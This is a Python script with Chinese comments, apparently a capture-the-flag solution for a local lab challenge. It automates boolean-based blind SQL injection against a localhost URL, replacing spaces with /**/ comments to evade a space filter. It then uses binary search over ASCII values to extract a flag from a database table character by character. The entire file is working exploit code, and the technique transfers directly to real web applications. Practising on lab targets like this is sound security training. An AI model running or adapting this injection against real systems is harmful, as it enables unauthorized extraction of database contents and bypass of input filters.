# 布尔盲注 + 空格过滤 解题脚本（si5b）——只用 Python 标准库
# 和 blind_boolean.py 的区别：payload 里所有空格用 /**/ 代替
# 用法：python blind_boolean_nospace.py
import urllib.request, urllib.parse

URL = "http://localhost:8083/si5b/"
TABLE = "flag5b_table"

def ask(cond):
    # 注意：空格全部换成 /**/（MySQL 把注释当空白解析，但字面不是空白字符）
    payload = "1/**/and/**/" + cond
    r = urllib.request.urlopen(URL + "?id=" + urllib.parse.quote(payload)).read().decode()
    return "查询到了" in r

flag = ""
for pos in range(1, 60):
    lo, hi = 32, 127
    while lo < hi:
        mid = (lo + hi) // 2
        cond = "ascii(substr((select/**/flag/**/from/**/%s),%d,1))>%d" % (TABLE, pos, mid)
        if ask(cond):
            lo = mid + 1
        else:
            hi = mid
    c = chr(lo)
    flag += c
    print(flag)
    if c == "}":
        break
print("FLAG:", flag)
